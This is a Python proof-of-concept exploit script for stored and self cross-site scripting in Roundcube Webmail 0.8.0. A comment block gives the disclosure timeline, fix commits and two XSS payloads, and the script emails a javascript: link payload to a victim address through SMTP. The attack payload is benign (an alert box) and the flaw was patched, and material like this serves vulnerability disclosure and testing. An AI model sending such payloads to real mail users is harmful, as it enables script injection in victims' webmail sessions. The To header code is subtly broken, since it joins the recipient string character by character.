#!/usr/bin/python
 
'''
# Exploit Title: Roundcube Webmail Stored XSS.
# Date: 14/08/2012
# Exploit Author: Shai rod (@NightRang3r)
# Vendor Homepage: http://roundcube.net
# Software Link: http://sourceforge.net/projects/roundcubemail/files/roundcubemail/0.8.0/roundcubemail-0.8.0.tar.gz/download
# Version: 0.8.0
 
 
#Gr33Tz: @aviadgolan , @benhayak, @nirgoldshlager, @roni_bachar
 
# Timeline:
#14 Aug 2012: Discovered Vulnerability.
#14 Aug 2012: Opened Ticket #1488613 - http://trac.roundcube.net/ticket/1488613
#15 Aug 2012: Fix added to repo.
 
https://github.com/roundcube/roundcubemail/commit/c086978f6a91eacb339fd2976202fca9dad2ef32
https://github.com/roundcube/roundcubemail/commit/5ef8e4ad9d3ee8689d2b83750aa65395b7cd59ee
 
 
About the Application:
======================
 
Roundcube is a free and open source webmail solution with a desktop-like user interface which is easy to install/configure and that runs on a standard LAMPP
server. The skins use the latest web standards such as XHTML and CSS 2. Roundcube includes other sophisticated open-source libraries such as PEAR,
an IMAP library derived from IlohaMail the TinyMCE rich text editor, Googiespell library for spell checking or the WasHTML sanitizer by Frederic Motte.
 
Vulnerability Description
=========================
 
1. Stored XSS in e-mail body.
 
XSS Payload: <a href=javascript:alert("XSS")>POC MAIL</a>
 
Send an email to the victim with the payload in the email body, Once the user clicks on the url the XSS should be triggered.
 
2. Self XSS in e-mail body (Signature).
 
XSS Payload: "><img src='1.jpg'onerror=javascript:alert("XSS")>
 
In order to trigger this XSS you should insert the payload into your signature.
 
Settings -> Identities -> Your Identitiy -> Signature
Now create a new mail, XSS Should be triggered.
 
'''
 
import smtplib
 
print "###############################################"
print "#       Roundcube 0.8.0 Stored XSS POC        #"
print "#             Coded by: Shai rod              #"
print "#               @NightRang3r                  #"
print "#           http://exploit.co.il              #"
print "#       For Educational Purposes Only!        #"
print "###############################################\r\n"
 
# SETTINGS
 
sender = "attacker@localhost"
smtp_login = sender
smtp_password = "qwe123"
recipient = "victim@localhost"
smtp_server  = "192.168.1.10"
smtp_port = 25
subject = "Roundcube Webmail XSS POC"
 
 
# SEND E-MAIL
 
print "[*] Sending E-mail to " + recipient + "..."
msg = ("From: %s\r\nTo: %s\r\nSubject: %s\n"
       % (sender, ", ".join(recipient), subject) )
msg += "Content-type: text/html\n\n"
msg += """<a href=javascript:alert("XSS")>Click Me, Please...</a>\r\n"""
server = smtplib.SMTP(smtp_server, smtp_port)
server.ehlo()
server.starttls()
server.login(smtp_login, smtp_password)
server.sendmail(sender, recipient, msg)
server.quit()
print "[+] E-mail sent!"

